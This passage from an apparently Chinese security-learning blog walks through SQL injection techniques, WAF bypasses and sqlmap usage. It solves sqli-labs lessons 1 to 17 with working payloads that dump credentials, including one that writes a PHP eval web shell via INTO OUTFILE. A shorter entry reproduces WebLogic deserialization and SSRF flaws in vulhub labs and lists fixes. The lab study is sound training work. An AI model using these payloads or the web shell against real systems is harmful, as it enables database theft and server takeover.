<p>​    在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)</p>
<p>利用Navicat for MySQL查看结构。</p>
<h5 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a><strong>增删改查</strong></h5><p><strong>SELECT</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">SELECT 列名称 <span class="keyword">FROM</span> 表名称 WHERE 字段<span class="attribute">1</span>=‘条件一’ <span class="keyword">AND</span> 字段<span class="attribute">2</span>=‘条件2’</span><br></pre></td></tr></table></figure>

<p><strong>INSERT</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">INSERT INTO table_name(列1<span class="built_in">..</span>.列2) VALUES(值1<span class="built_in">..</span><span class="built_in">..</span>值2<span class="built_in">..</span><span class="built_in">..</span>)</span><br></pre></td></tr></table></figure>

<p><strong>UPDATE</strong></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名称 <span class="keyword">SET</span> 列名称=新值 <span class="keyword">WHERE</span> 列名称=某值</span><br></pre></td></tr></table></figure>

<p><strong>DELETE</strong></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名称 <span class="keyword">WHERE</span> 列名称=值</span><br></pre></td></tr></table></figure>

<h5 id="Mysql常用的几种函数："><a href="#Mysql常用的几种函数：" class="headerlink" title="Mysql常用的几种函数："></a><strong>Mysql常用的几种函数：</strong></h5><ul>
<li>user():查看当前Mysql登录用户名；</li>
<li>database():查看当前使用Mysql数据库名；</li>
<li>version():查看当前Mysql版本。</li>
<li>扩展limit关键字 limit m,n 从m行开始，到m+n行。</li>
</ul>
<h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a><strong>注释</strong></h5><ul>
<li>注释符：在Mysql中常见的注释符表达式：#、–空格、/**/</li>
<li>/<em>！SQL语句、\</em>/只有Mysql可以识别，常用来绕过WAF。</li>
</ul>
<p>例如：<code>select * from articles where id -id ;</code></p>
<p>使用内联注释注入：<code>select * from articles where id=-1 /*!union\*/ /\*!select\*/ 1,2,3,4</code></p>
<h5 id="注入点查找"><a href="#注入点查找" class="headerlink" title="注入点查找"></a>注入点查找</h5><ul>
<li>and 1=1/and 1=2（整型）</li>
<li>随机输入(整型)</li>
<li>-1/+1回显上下页</li>
<li>单引号（字符型/整型）</li>
<li>and sleep(5)(判断页面返回时间)</li>
</ul>
<h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><p><strong>根据语法：</strong></p>
<p><strong>1.可联合查询注入：</strong></p>
<p>注入前提：能使用union , 页面必须有显示位</p>
<p>注入方法：</p>
<ul>
<li>找到注入点并判断闭合字符</li>
<li>判断数据库类型</li>
<li>猜解列数，爆显示位</li>
<li>得到基本信息（如数据库名、数据库版本等）</li>
<li>猜解表名</li>
<li>得到列名</li>
<li>得到列值</li>
</ul>
<p><strong>2.报错型注入</strong></p>
<p>注入前提：页面没有显示位，源码使用了echo mysql_error输出了错误信息</p>
<p>​                    注入速度快，语句复杂、不能使用group_concat(),只能使用limit依次猜解</p>
<p>注入方法：</p>
<ul>
<li>floor报错注入</li>
</ul>
<p>​      <code>select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</code></p>
<ul>
<li><p>updatexml报错注入</p>
</li>
<li><p>extractvalue报错注入</p>
</li>
</ul>
<p><strong>3.布尔型注入</strong></p>
<p>注入前提：页面存在注入但是没有显示位且源码没有使用echo mysql_error()输出报错信息。</p>
<p>注入方法:</p>
<ul>
<li>?id=1 and (注入语句) # 根据返回结果是否相同来得到数据</li>
<li>主要利用了length()、ascii()、substr()得到结果</li>
</ul>
<p><strong>4.基于时间延迟注入</strong></p>
<p>根据页面返回时间的不同来得到数据</p>
<h5 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h5><p>题目地址：<a href="http://123.206.87.240:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://123.206.87.240:9004/1ndex.php?id=1</a></p>
<p>做题步骤：检测注入=&gt;了解过滤=&gt;获取数据</p>
<h5 id="orderby-注入"><a href="#orderby-注入" class="headerlink" title="orderby 注入"></a>orderby 注入</h5><p><code>select username,password FROM  users order by 1 asc;</code></p>
<p>1.直接加报错注入</p>
<p>2.Rand()方式</p>
<p>3.And payload时间盲注方式</p>
<p>4.其他方式</p>
<p><strong>5.多语句查询(堆叠查询）</strong></p>
<p>注入前提：只在MSSQL数据库存在</p>
<p>注入方法：一个SQL语句后跟分号后再跟一个语句即可执行两个语句。</p>
<p><strong>根据类型：</strong></p>
<ul>
<li>整型</li>
<li>字符串型</li>
<li>搜索型</li>
</ul>
<h5 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h5><ul>
<li>GET</li>
<li>POST</li>
<li>X-Forward-For</li>
<li>Cookie</li>
<li>User-Agent</li>
</ul>
<h4 id="SQL注入绕过机制"><a href="#SQL注入绕过机制" class="headerlink" title="SQL注入绕过机制"></a>SQL注入绕过机制</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>​         如果程序中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤。例如：and过滤。当然这种过滤只是发现关键字出现。并不会对关键字进行处理。<br>​    通过修改关键字内字母大小写来绕过过滤措施。例如： AnD 1=1</p>
<p>​     例如，在进行探测当前表的字段数时，使用order by数字进行探测。如果过滤了order,可以使用OrdER来进行绕过。</p>
<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>如果在程序中设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。</p>
<p>例如：过滤了union，我们可以使用ununionion进行绕过。</p>
<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p>可以利用网络中的URL在线编码，绕过SQL注入的过滤机制。</p>
<img src="QQ截图20200206143207.png" style="zoom:80%;" />

<hr>
<h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h5><p>在Mysql中内联注释中的内容可以被当做SQL语句执行。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206143914.png" alt=""></p>
<h4 id="sqlmap基础使用方法"><a href="#sqlmap基础使用方法" class="headerlink" title="sqlmap基础使用方法"></a>sqlmap<strong>基础使用方法</strong></h4><h5 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a><strong>sqlmap简介</strong></h5><p>​       sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令</p>
<p>​         sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<ul>
<li>基于布尔的盲注：既可以根据返回页面判断条件真假的注入。</li>
</ul>
<p>​        向数据库发送true或false这样的问题，并根据应用程序赶回的信息判断结果、这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题。</p>
<ul>
<li>基于时间的盲注:即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>
<li>基于报错注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
<li>联合查询注入：可以使用union的情况下的注入</li>
<li>堆查询注入：可以同时执行多条语句的执行时注入</li>
</ul>
<p><strong>sqlmap常用参数</strong></p>
<ul>
<li><p>-h -help显示基本帮助信息</p>
</li>
<li><p>-hh 显示高级帮助信息并退出</p>
</li>
<li><p>-u指定url</p>
</li>
<li><p>-p指定参数</p>
</li>
<li><p>-D指定数据库</p>
</li>
<li><p>-T指定表</p>
</li>
<li><p>-C指定字段</p>
</li>
<li><p>–current-db当前数据库</p>
</li>
<li><p>–current-user当前用户</p>
</li>
<li><p>–dbs查询所有数据库</p>
</li>
<li><p>–tables查询所有表</p>
</li>
<li><p>–columns查询所有字段名</p>
</li>
<li><p>–dump查询记录</p>
</li>
<li><p>–techniques X(X=B布尔型，E报错型，U联合注入型，T延时型）</p>
</li>
</ul>
<h4 id="sqli-labs靶场实战"><a href="#sqli-labs靶场实战" class="headerlink" title="sqli-labs靶场实战"></a>sqli-labs靶场实战</h4><h5 id="less-1-基于错误的GET单引号字符型注入）"><a href="#less-1-基于错误的GET单引号字符型注入）" class="headerlink" title="less-1 (基于错误的GET单引号字符型注入）"></a>less-1 (基于错误的GET单引号字符型注入）</h5><p><strong>注入过程：</strong></p>
<p><code>?id=1&#39; or 1=1 %23</code></p>
<p><code>?id=1&#39; order by 3 %23</code>  #字段数为3</p>
<p><code>?id=1&#39; union select 1,2,3</code> #显示位为2，3</p>
<p><strong>爆库名</strong></p>
<p><code>?id=1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata) %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205184721.png" alt=""></p>
<p><strong>爆表名</strong></p>
<p><code>?id=1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)%23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205184704.png" alt=""></p>
<p><strong>爆列名</strong></p>
<p><code>?id=1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39;) %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205184647.png" alt=""></p>
<p><strong>爆用户名和密码</strong></p>
<p><code>?id=1&#39; union select 1,(select group_concat(password) from security.users) ,(select group_concat(username) from security.users) %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205184623.png" alt=""></p>
<p><strong>使用sqlmap自动化探测</strong></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs --batch</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205190036.png" alt=""></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security --tables --batch</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205190557.png" alt=""></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --batch</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205190649.png" alt=""></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C password,username --dump --batch</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205192706.png" alt=""></p>
<h5 id="Less-2-（基于错误的GET整型注入）"><a href="#Less-2-（基于错误的GET整型注入）" class="headerlink" title="Less-2 （基于错误的GET整型注入）"></a>Less-2 （基于错误的GET整型注入）</h5><p>数字型注入，去掉单引号即可。</p>
<p>构造同Less-1</p>
<h5 id="Less-3-（基于错误的GET单引号变形字符型注入）"><a href="#Less-3-（基于错误的GET单引号变形字符型注入）" class="headerlink" title="Less-3 （基于错误的GET单引号变形字符型注入）"></a>Less-3 （基于错误的GET单引号变形字符型注入）</h5><p>?id=1’) %23 回显正常</p>
<p>构造同Less-1</p>
<h5 id="Less-4（基于错误的GET双引号字符型注入）"><a href="#Less-4（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4（基于错误的GET双引号字符型注入）"></a>Less-4（基于错误的GET双引号字符型注入）</h5><p>?id=1”)%23 回显正常</p>
<p>构造同Less-01</p>
<h5 id="Less-5（双注入GET单引号字符型注入）"><a href="#Less-5（双注入GET单引号字符型注入）" class="headerlink" title="Less-5（双注入GET单引号字符型注入）"></a>Less-5（双注入GET单引号字符型注入）</h5><p><strong>爆库名</strong></p>
<p><code>?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206132510.png" alt=""></p>
<p><strong>爆表名</strong></p>
<p><code>?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206132607.png" alt=""></p>
<p><strong>更换Limit后的数字即可查出其他表名</strong></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206132652.png" alt=""></p>
<p><strong>爆user表列名</strong></p>
<p><code>?id=1&#39;  union select count(*),1, concat(&#39;~&#39;,(select column_namefrom information_schema.tables where table_schema=&#39;security&#39;   and table_name=&#39;users&#39; limit 0,1),&#39;~&#39;,floor(rand()2)) as a from information_schema gruop by a %23</code></p>
<p><strong>爆username password内容</strong></p>
<p><code>?id=1&#39;union select count(*),1, concat(&#39;~&#39;,(select username from users limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206133237.png" alt=""></p>
<p><code>?id=1&#39;union select count(*),1, concat(&#39;~&#39;,(select password from users limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a  %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206133320.png" alt=""></p>
<h5 id="Less-6-双注入GET双引号字符型注入）"><a href="#Less-6-双注入GET双引号字符型注入）" class="headerlink" title="Less-6 (双注入GET双引号字符型注入）"></a>Less-6 (双注入GET双引号字符型注入）</h5><p>将单引号换成双引号即可</p>
<p>构造同上</p>
<h5 id="Less-7-导出文件GET字符型注入）"><a href="#Less-7-导出文件GET字符型注入）" class="headerlink" title="Less-7(导出文件GET字符型注入）"></a>Less-7(导出文件GET字符型注入）</h5><p>我们首先需要打开phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure_file_priv=“/”。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206122518.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206120820.png" alt=""></p>
<p>我们需要用到两个函数：</p>
<p><strong>load_file()：</strong>读取本地文件</p>
<p><strong>into outfile()</strong> 写文件 （路径需要使用双斜线）</p>
<p>我们首先判断注入点：</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206121046.png" alt=""></p>
<p>然后我们使用outfile函数将一句话木马写入文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;crow&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php&quot;</span><br></pre></td></tr></table></figure>

<p><img src="QQ%E6%88%AA%E5%9B%BE20200206123636.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206123628.png" alt=""></p>
<p>之后我们使用中国菜刀连接即可。 </p>
<h5 id="Less-8-基于布尔的盲注）"><a href="#Less-8-基于布尔的盲注）" class="headerlink" title="Less-8 (基于布尔的盲注）"></a>Less-8 (基于布尔的盲注）</h5><p><strong>爆数据库长度</strong></p>
<p><code>?id=1&#39; and (length(database())) = 8 %23 #数据库长度为8</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205195014.png" alt=""></p>
<p>我们任意修改长度，页面不回显</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205195102.png" alt=""></p>
<p><strong>爆库名</strong></p>
<p><code>?id=1&#39; and (ascii(substr((select database()) ,1,1))) = 115 %23 # s</code></p>
<p><code>?id=1&#39;and(ascii(substr((select database()),2,1)))=101 %23 #e</code></p>
<p><code>?id=1&#39;and(ascii(substr((select database()),3,1)))=99 %23 #c</code></p>
<p><code>?id=1&#39; and (ascii(substr((select database()) ,4,1))) = 117 --+ #u</code></p>
<p><code>?id=1&#39; and (ascii(substr((select database()) ,5,1))) = 114 --+ #r</code></p>
<p>   <code>and (ascii(substr((select database()) ,6,1))) = 105 --+    #i</code></p>
<p><code>and (ascii(substr((select database()) ,7,1))) = 116 --+   #t</code></p>
<p><code>?id=1&#39; and (ascii(substr((select database()) ,8,1))) = 121 --+  #y</code></p>
<p><strong>爆表名长度</strong></p>
<p><code>?id=1&#39; and (length((select table_name from information_schema.tables  where table_schema=database() limit 0,1)))=6 %23</code></p>
<p>类推以上即可：</p>
<h5 id="Less-9（基于时间的GET单引号盲注）"><a href="#Less-9（基于时间的GET单引号盲注）" class="headerlink" title="Less-9（基于时间的GET单引号盲注）"></a>Less-9（基于时间的GET单引号盲注）</h5><p><code>?id=1&#39; and sleep(5) %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205194242.png" alt=""></p>
<p><code>?id=1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200205194753.png" alt=""></p>
<p>接下来使用sqlmap自动化注入</p>
<p><strong>爆数据库名：</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="string">//localhost</span><span class="function">:8088</span>/sqlilabs/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><strong>爆表名：</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="string">//localhost</span><span class="function">:8088</span>/sqlilabs/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security <span class="params">--tables</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><strong>爆列名</strong>：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="string">//localhost</span><span class="function">:8088</span>/sqlilabs/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security -T users <span class="params">--column</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><strong>爆内容 ：</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="string">//localhost</span><span class="function">:8088</span>/sqlilabs/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security -T users -C username,password <span class="params">--dump</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<h5 id="Less-10-基于时间的双引号盲注）"><a href="#Less-10-基于时间的双引号盲注）" class="headerlink" title="Less-10 (基于时间的双引号盲注）"></a>Less-10 (基于时间的双引号盲注）</h5><p><code>?id=1&quot; and sleep(5) %23</code></p>
<p>同上</p>
<h5 id="Less-11-基于错误的POST型单引号字符型注入）"><a href="#Less-11-基于错误的POST型单引号字符型注入）" class="headerlink" title="Less-11(基于错误的POST型单引号字符型注入）"></a>Less-11(基于错误的POST型单引号字符型注入）</h5><p>提交方式改为POST，使用burp进行抓包修改。</p>
<p><code>uname=admin&#39; and 1=1 %23 &amp;passwd=admin&amp;submit=Submit  #成功登录</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206125708.png" alt=""></p>
<p><code>uname=admin&#39; and 1=2  %23&amp; passwd=admin&amp;submit=Submit #不能登录</code></p>
<p><img src="%5CQQ%E6%88%AA%E5%9B%BE20200206125727.png" alt=""></p>
<p>存在报错型注入，我们使用extractvalue()函数。</p>
<p><strong>爆数据库</strong></p>
<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206130037.png" alt=""></p>
<p><strong>爆表名</strong></p>
<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select  group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e)) %23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206130124.png" alt=""></p>
<p><strong>爆列名</strong></p>
<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_shcema.columns where table_name=&#39;users&#39;),0x7e))%23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206130709.png" alt=""></p>
<p><strong>爆用户名密码</strong></p>
<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</code></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206130537.png" alt=""></p>
<p>sqlmap自动化注入：</p>
<p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用Sqlmap -r 文件路径 -p 指定探测参数。</p>
<h5 id="Less-12-基于错误的双引号POST型字符型变形的注入）"><a href="#Less-12-基于错误的双引号POST型字符型变形的注入）" class="headerlink" title="Less-12(基于错误的双引号POST型字符型变形的注入）"></a>Less-12(基于错误的双引号POST型字符型变形的注入）</h5><p><strong>换成双引号即可；</strong></p>
<p><strong>爆数据库名</strong>：</p>
<p><code>uname=admin&quot; and extractvalue(1,concat(0x7e,(select database(),0x7e)))  &quot;%23</code></p>
<p><strong>爆表名</strong>：</p>
<p><code>uname=admin&quot;  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and &quot;</code> </p>
<p><strong>爆列名</strong>：</p>
<p><code>uname=admin&quot;  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))  and &quot;</code><br><strong>爆用户名密码：</strong></p>
<p><code>uname=admin“ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</code></p>
<h5 id="Less-13-POST单引号变形双注入）"><a href="#Less-13-POST单引号变形双注入）" class="headerlink" title="Less-13(POST单引号变形双注入）"></a>Less-13(POST单引号变形双注入）</h5><p><strong>floor 报错注入</strong></p>
<p><code>1&#39;) union select count(*),concat_ws(&#39;~&#39;,(select user()),(select database()),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<p><code>1&#39;) union select count(*),concat_ws(&#39;:&#39;,(select user()),(select database()),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<p><strong>爆表名</strong></p>
<p><code>&#39;) union select count(*),concat_ws(&#39;++&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<p><strong>爆列名</strong></p>
<p><code>&#39;) union select count(*),concat_ws(&#39;+&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<p><strong>爆数据</strong></p>
<p><code>&#39;) union select count(*),concat_ws(&#39;;&#39;,(select username from users limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<h5 id="Less-14-POST双引号变形双注入）"><a href="#Less-14-POST双引号变形双注入）" class="headerlink" title="Less-14(POST双引号变形双注入）"></a>Less-14(POST双引号变形双注入）</h5><p>将单引号闭合换成双引号即可。</p>
<p>过程同上。</p>
<h5 id="Less-15-基于bool型-时间延迟单引号POST型盲注）"><a href="#Less-15-基于bool型-时间延迟单引号POST型盲注）" class="headerlink" title="Less-15(基于bool型/时间延迟单引号POST型盲注）"></a>Less-15(基于bool型/时间延迟单引号POST型盲注）</h5><p>使用延时注入</p>
<p><code>admin&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) #</code></p>
<p>逐个判断即可；</p>
<h5 id="Less-16-基于bool型-时间延迟双引号POST型盲注）"><a href="#Less-16-基于bool型-时间延迟双引号POST型盲注）" class="headerlink" title="Less-16(基于bool型/时间延迟双引号POST型盲注）"></a>Less-16(基于bool型/时间延迟双引号POST型盲注）</h5><p>根据源码我们可以知道闭合方法： 使用”）进行闭合</p>
<p>使用延时注入</p>
<p>同上。</p>
<h5 id="Less-17-基于错误的更新查询POST注入）"><a href="#Less-17-基于错误的更新查询POST注入）" class="headerlink" title="Less-17(基于错误的更新查询POST注入）"></a>Less-17(基于错误的更新查询POST注入）</h5><p><strong>爆数据库版本</strong></p>
<p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,version(),0x5c),1))#submit=submit</code></p>
<p><strong>爆表名</strong></p>
<p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x5c),1))#submit=submit</code></p>
<p><strong>爆字段名</strong></p>
<p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#39;admin&#39;)aa),0x5c),1))#submit=submit</code></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>SQL注入学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp5框架学习</title>
    <url>/2020/04/19/thinkphp5-kuang-jia-xue-xi/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Weblogic中间件漏洞</title>
    <url>/2020/04/03/weblogic-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="WebLogic中间件漏洞复现"><a href="#WebLogic中间件漏洞复现" class="headerlink" title="WebLogic中间件漏洞复现"></a>WebLogic中间件漏洞复现</h2><h4 id="WebLogic简介"><a href="#WebLogic简介" class="headerlink" title="WebLogic简介"></a>WebLogic简介</h4><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<h4 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h4><h5 id="1-漏洞原理："><a href="#1-漏洞原理：" class="headerlink" title="1.漏洞原理："></a>1.漏洞原理：</h5><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
<h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>使用vulhub实验环境，启动实验环境，访问靶机，抓包，修改数据包。</p>
<p><a href="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955349_5c1625d5f0cfb.png!small" alt="img"></a></p>
<p>Kali启动监听。</p>
<p>发送数据包成功后，拿到shell。</p>
<p><a href="https://image.3001.net/images/20181216/1544955361_5c1625e14f776.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955361_5c1625e14f776.png!small" alt="img"></a></p>
<p><strong>3、漏洞修复</strong></p>
<p>1）升级Oracle 10月份补丁。</p>
<p>2）对访问wls-wsat的资源进行访问控制。</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Weblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<p><strong>2、 漏洞复现</strong></p>
<p>使用vulhub实验环境，启动环境。</p>
<p>访问<a href="http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp。" target="_blank" rel="noopener">http://192.168.139.129:7001/uddiexplorer/SearchPublicRegistries.jsp。</a></p>
<p><a href="https://image.3001.net/images/20181216/1544955373_5c1625edf3c4f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955373_5c1625edf3c4f.png!small" alt="img"></a></p>
<p>用burp抓包，修改请求。</p>
<p><a href="https://image.3001.net/images/20181216/1544955383_5c1625f70b11d.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955383_5c1625f70b11d.png!small" alt="img"></a></p>
<p>启动nc监听2222端口。</p>
<p><a href="https://image.3001.net/images/20181216/1544955390_5c1625febc7e3.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955390_5c1625febc7e3.png!small" alt="img"></a></p>
<p>拿到shell。</p>
<h5 id="3-漏洞修复"><a href="#3-漏洞修复" class="headerlink" title="3.漏洞修复"></a>3.漏洞修复</h5><p>方法一：</p>
<p>以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了；</p>
<p>方法二：</p>
<p>1）删除uddiexplorer文件夹</p>
<p>2）限制uddiexplorer应用只能内网访问</p>
<p>方法三：（常用）</p>
<p>Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下：</p>
<p>1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份</p>
<p>2）将weblogic安装目录下的server/lib/uddiexplorer.war下载</p>
<p>3）用winrar等工具打开uddiexplorer.war</p>
<p>4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx</p>
<p>5）保存后上传回服务端替换原先的uddiexplorer.war</p>
<p>6）对于多台主机组成的集群，针对每台主机都要做这样的操作</p>
<p>7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用–停server–停控制台–启控制台–启server–启应用）</p>
